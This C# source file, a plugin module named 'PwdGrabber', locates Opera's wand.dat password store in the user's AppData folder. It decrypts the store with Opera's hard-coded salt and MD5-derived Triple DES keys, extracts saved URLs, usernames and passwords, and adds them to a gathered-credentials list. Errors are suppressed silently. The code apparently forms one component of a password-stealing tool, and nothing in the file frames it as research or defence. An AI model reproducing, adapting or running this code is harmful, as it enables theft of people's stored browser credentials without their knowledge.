using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Plugin_PwdGrabber
{
    public static class Opera
    {
        private static byte[] opera_salt = { 0x83, 0x7D, 0xFC, 0x0F, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };
        private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static void Start()
        {

            //Find wand
            if (File.Exists(path + @"\Opera\Opera\wand.dat"))
            {
                path += @"\Opera\Opera\wand.dat";
                findBlocks();
            }
            else if (File.Exists(path + @"\Opera\Opera\profile\wand.dat"))
            {
                path += @"\Opera\Opera\profile\wand.dat";
                findBlocks();
            }
            else
            {
            }
        }

        private static void findBlocks()
        {
            try
            {
                //Init TempList to process data after
                List<string> tmpData = new List<string>();

                //Read wand file
                byte[] wand_file = File.ReadAllBytes(path);

                //used index variables
                int block_size = 0;

                //search for blocks until last block is found
                for (int i = 0; i < wand_file.Length - 4; i++)
                {
                    //Find block
                    if (wand_file[i] == 0x00 && wand_file[i + 1] == 0x00 && wand_file[i + 2] == 0x00 && wand_file[i + 3] == 0x08)
                    {
                        //read blocksize
                        block_size = (int)wand_file[i + 15];

                        //seperate parts
                        byte[] key = new byte[8];
                        byte[] encrypt_data = new byte[block_size];
                        Array.Copy(wand_file, i + 4, key, 0, key.Length);
                        Array.Copy(wand_file, i + 16, encrypt_data, 0, encrypt_data.Length);

                        //Give array to decrypt method
                        tmpData.Add(decrypt2_method(key, encrypt_data));

                        //Set new i
                        i += 11 + block_size;
                    }
                }

                string[] Lines = tmpData.ToArray();

                List<string> User = new List<string>();
                List<string> Urls = new List<string>();

                for (int j = 6; (j <= (Lines.Length - 1)); j++)
                {
                    string Url = "";
                    string UserName = "";
                    string Password = "";
                    string Other = "";

                    if (Lines[j].Contains("http://") || Lines[j].Contains("https://") || Lines[j].Contains("ftp://"))
                    {
                        Urls.Add(Lines[j]);
                    }

                    if (Lines[j].Contains("http://") || Lines[j].Contains("https://") || Lines[j].Contains("ftp://"))
                    {
                        User.Add(Lines[j + 2]);
                    }


                    if (System.Uri.IsWellFormedUriString(Lines[j], UriKind.RelativeOrAbsolute))
                    {
                        Password = Lines[j].Replace("\0", "");
                        Url = Urls[0].Replace("\0", "");
                        UserName = User[1].Replace("\0", "");
                        Other = Urls[1].Replace("\0", "");
                        User.Clear();
                        Urls.Clear();

                        UserDataManager.GatheredCredentials.Add(new Credential("Opera", Url, UserName, Password, Other));
                    }
                }
            }
                
            catch { }
        }
            

        private static string decrypt2_method(byte[] key, byte[] encrypt_data)
        {
            try
            {
                //Setup MD5 Crypter
                MD5CryptoServiceProvider md5Crypt = new MD5CryptoServiceProvider();
                md5Crypt.Initialize();

                //Create hash 1 (salt + key)
                byte[] tmpBuffer = new byte[opera_salt.Length + key.Length];
                Array.Copy(opera_salt, tmpBuffer, opera_salt.Length);
                Array.Copy(key, 0, tmpBuffer, opera_salt.Length, key.Length);
                byte[] hash1 = md5Crypt.ComputeHash(tmpBuffer);

                //Create hash 2 (hash1 + salt + key)
                tmpBuffer = new byte[hash1.Length + opera_salt.Length + key.Length];
                Array.Copy(hash1, tmpBuffer, hash1.Length);
                Array.Copy(opera_salt, 0, tmpBuffer, hash1.Length, opera_salt.Length);
                Array.Copy(key, 0, tmpBuffer, hash1.Length + opera_salt.Length, key.Length);
                byte[] hash2 = md5Crypt.ComputeHash(tmpBuffer);

                //Setup 3DES Crypter
                TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
                tripleDES.Mode = CipherMode.CBC;
                tripleDES.Padding = PaddingMode.ISO10126;

                //Split parts witch will be needed
                byte[] tripleKey = new byte[24];
                byte[] IV = new byte[8];
                Array.Copy(hash1, tripleKey, hash1.Length);
                Array.Copy(hash2, 0, tripleKey, hash1.Length, 8);
                Array.Copy(hash2, 8, IV, 0, 8);

                //Start decrypting
                tripleDES.Key = tripleKey;
                tripleDES.IV = IV;
                ICryptoTransform decryter = tripleDES.CreateDecryptor();
                byte[] output = decryter.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length);

                return System.Text.Encoding.Unicode.GetString(output);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return "";
            }
        }
    }
}
